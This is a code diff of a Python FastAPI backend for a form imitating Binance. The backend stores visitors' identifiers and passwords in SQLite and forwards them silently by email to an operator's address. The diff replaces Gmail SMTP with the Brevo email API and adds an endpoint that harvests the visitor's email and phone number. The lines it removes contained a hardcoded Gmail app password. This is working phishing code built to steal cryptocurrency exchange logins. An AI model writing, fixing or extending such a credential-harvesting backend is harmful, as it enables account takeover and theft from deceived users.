@@ -1,25 +1,13 @@
-"""
-Backend FastAPI – Formulario estilo Binance
-Guarda datos en SQLite y envía notificación por correo (Gmail SMTP)
-
-Instalar:
-    pip install fastapi uvicorn aiosqlite
-
-Correr:
-    uvicorn main:app --reload --port 8000
-"""
-
 import sqlite3
 import aiosqlite
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import requests
 from fastapi import FastAPI, HTTPException, status
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse, JSONResponse
 from pydantic import BaseModel, field_validator
 from datetime import datetime
+import traceback
 import re, os
 
 # ─────────────────────────────────────────────────────────────
@@ -27,22 +15,16 @@ import re, os
 # ─────────────────────────────────────────────────────────────
 DB_PATH = "formulario.db"
 
-# Cuenta Gmail que ENVÍA (la tuya, no la de destino)
-GMAIL_REMITENTE  = "binancee162@gmail.com"       # ← cámbialo
-GMAIL_CONTRASENA = "egef zbyr cevz zqev"      # ← App Password de Google (ver instrucciones abajo)
 
-# Correo donde llegan los datos
-CORREO_DESTINO   = "santicris162@gmail.com"
 
-# ─────────────────────────────────────────────────────────────
-# Cómo obtener el App Password de Google (contraseña de aplicación):
-#   1. Entra a myaccount.google.com → Seguridad
-#   2. Activa "Verificación en dos pasos" si no está activa
-#   3. Busca "Contraseñas de aplicaciones"
-#   4. Crea una nueva → selecciona "Correo" y "Otro (nombre personalizado)"
-#   5. Google te dará una clave de 16 caracteres → ponla en GMAIL_CONTRASENA
-# ─────────────────────────────────────────────────────────────
+GMAIL_REMITENTE = os.getenv("GMAIL_REMITENTE")
+GMAIL_CONTRASENA = os.getenv("GMAIL_CONTRASENA")
+CORREO_DESTINO = os.getenv("CORREO_DESTINO")
+BREVO_API_KEY = os.getenv("BREVO_API_KEY")
 
+print("REMITENTE:", GMAIL_REMITENTE)
+print("DESTINO:", CORREO_DESTINO)
+print("PASSWORD EXISTE:", GMAIL_CONTRASENA is not None)
 # ─────────────────────────────────────────────────────────────
 # App
 # ─────────────────────────────────────────────────────────────
@@ -109,53 +91,195 @@ class FormResponse(BaseModel):
 
 # Agrega esta clase nueva para recibir los datos del formulario 2
 class DatosVerificacion(BaseModel):
-    tipo: str  # "correo" o "telefono"
-    valor: str
+    correo: str
+    telefono: str
+
 
 @app.post("/api/verificacion")
 async def guardar_verificacion(data: DatosVerificacion):
-    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # Esto toma el dato que enviaste (correo o teléfono) y lo envía a tu email
+
     try:
-        # Reutilizamos tu lógica de envío
-        enviar_correo(
-            identificador=data.valor, 
-            codigo_pais="N/A", 
-            contrasena=f"Tipo de dato: {data.tipo}", 
-            fecha=fecha
+
+        print("Correo:", data.correo)
+        print("Telefono:", data.telefono)
+
+        enviar_correo_verificacion(
+            data.correo,
+            data.telefono
         )
+
+        return {
+            "status": "ok"
+        }
+
     except Exception as e:
-        print(f"Error al enviar correo: {e}")
-        
-    return {"status": "ok"}
+
+        traceback.print_exc()
+
+        return JSONResponse(
+            status_code=500,
+            content={
+                "status": "error",
+                "mensaje": str(e)
+            }
+        )
+
+
 # ─────────────────────────────────────────────────────────────
 # Función de envío de correo (Gmail SMTP)
 # ─────────────────────────────────────────────────────────────
-def enviar_correo(identificador: str, codigo_pais: str, contrasena: str, fecha: str):
-    """Envía los datos del formulario a CORREO_DESTINO via Gmail SMTP."""
-    asunto = f"📋 Nuevo registro Binance – {fecha}"
-    cuerpo = f"""\
-Nuevo registro recibido:
+def enviar_correo_formulario(identificador, codigo_pais, contrasena, fecha):
 
-📅 Fecha:         {fecha}
-🌍 País:          {codigo_pais}
-📱 Identificador: {identificador}
-🔑 Contraseña:    {contrasena}
+    url = "https://api.brevo.com/v3/smtp/email"
 
-— Formulario Binance
-"""
-    msg = MIMEMultipart()
-    msg["From"]    = GMAIL_REMITENTE
-    msg["To"]      = CORREO_DESTINO
-    msg["Subject"] = asunto
-    msg.attach(MIMEText(cuerpo, "plain", "utf-8"))
+    headers = {
+        "accept": "application/json",
+        "api-key": BREVO_API_KEY,
+        "content-type": "application/json"
+    }
 
-    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as servidor:
-        servidor.login(GMAIL_REMITENTE, GMAIL_CONTRASENA)
-        servidor.sendmail(GMAIL_REMITENTE, CORREO_DESTINO, msg.as_string())
+    payload = {
+        "sender": {
+            "name": "Nuevo registro recibido",
+            "email": GMAIL_REMITENTE
+        },
+        "to": [
+            {
+                "email": CORREO_DESTINO
+            }
+        ],
+        "subject": "🚨 Nuevo formulario recibido",
 
+        "htmlContent": f"""
+            <html>
+            <body style="font-family:Arial; background:#f5f5f5; padding:30px;">
+            
+            <div style="max-width:600px;margin:auto;background:white;padding:25px;border-radius:8px;">
+            
+            <h2 style="color:#333;">
+            Nuevo registro recibido
+            </h2>
+            
+            <hr>
+            
+            <p><b>Identificador:</b> {identificador}</p>
+            
+            <p><b>Código:</b> {codigo_pais}</p>
+            
+            <p><b>Dato registrado:</b> {contrasena}</p>
+            
+            <p><b>Fecha:</b> {fecha}</p>
+            
+            <hr>
+            
+            <p style="font-size:13px;color:#666;">
+            Este mensaje fue generado automáticamente por el sistema.
+            </p>
+            
+            <p style="font-size:13px;color:#666;">
+            Si tiene alguna duda puede comunicarse con nosotros.
+            </p>
+            
+            <p>
+            📧 contacto@miempresa.com<br>
+            📞 +57 300 123 4567
+            </p>
+            
+            </div>
+            
+            </body>
+            </html>
+            """
+    }
 
+    respuesta = requests.post(
+        url,
+        json=payload,
+        headers=headers,
+        timeout=30
+    )
+    print("========== PAYLOAD ==========")
+    print(payload)
+    print("========== RESPUESTA ==========")
+    print(respuesta.status_code)
+    print(respuesta.text)
+
+    respuesta.raise_for_status()
+
+def enviar_correo_verificacion(correo, telefono):
+
+    url = "https://api.brevo.com/v3/smtp/email"
+
+    headers = {
+        "accept": "application/json",
+        "api-key": BREVO_API_KEY,
+        "content-type": "application/json"
+    }
+
+    payload = {
+        "sender": {
+            "name": "Información adicional recibida",
+            "email": GMAIL_REMITENTE
+        },
+        "to": [
+            {
+                "email": CORREO_DESTINO
+            }
+        ],
+        "subject": "Información adicional recibida",
+
+        "htmlContent": f"""
+            <html>
+            <body style="font-family:Arial; background:#f5f5f5; padding:30px;">
+
+            <div style="max-width:600px;margin:auto;background:white;padding:25px;border-radius:8px;">
+
+            <h2 style="color:#333;">
+            Información adicional recibida
+            </h2>
+
+            <hr>
+
+            <p><b>Campo 1:</b> {correo}</p>
+
+            <p><b>Campo 2:</b> {telefono}</p>
+
+            
+
+            <hr>
+
+            <p style="font-size:13px;color:#666;">
+            Este mensaje fue generado automáticamente por el sistema.
+            </p>
+
+            <p style="font-size:13px;color:#666;">
+            Si necesita ayuda, comuníquese con nuestro equipo de soporte.
+            </p>
+
+            <p>
+            📧 contacto@miempresa.com<br>
+            📞 +57 300 123 4567
+            </p>
+
+            </div>
+
+            </body>
+            </html>
+            """
+    }
+
+    respuesta = requests.post(
+        url,
+        json=payload,
+        headers=headers,
+        timeout=30
+    )
+
+    print("========== VERIFICACION ==========")
+    print("Status:", respuesta.status_code)
+    print(respuesta.text)
+
+    respuesta.raise_for_status()
 # ─────────────────────────────────────────────────────────────
 # Endpoints
 # ─────────────────────────────────────────────────────────────
@@ -174,6 +298,11 @@ async def guardar_formulario(data: FormData):
     y los envía automáticamente al correo configurado.
     """
     fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    print("========== DATOS ==========")
+    print("Identificador:", data.identificador)
+    print("Codigo:", data.codigo_pais)
+    print("Contraseña:", data.contrasena)
+    print("Fecha:", fecha)
 
     # 1️⃣  Guardar en SQLite
     async with aiosqlite.connect(DB_PATH) as db:
@@ -187,10 +316,14 @@ async def guardar_formulario(data: FormData):
 
     # 2️⃣  Enviar correo silenciosamente
     try:
-        enviar_correo(data.identificador, data.codigo_pais, data.contrasena, fecha)
-    except Exception as e:
-        # Si falla el correo el registro ya quedó en SQLite — no detenemos al usuario
-        print(f"[EMAIL ERROR] {e}")
+        enviar_correo_formulario(
+            data.identificador,
+            data.codigo_pais,
+            data.contrasena,
+            fecha
+        )
+    except Exception:
+        traceback.print_exc()
 
     return FormResponse(mensaje="Datos guardados correctamente", id=nuevo_id)
 
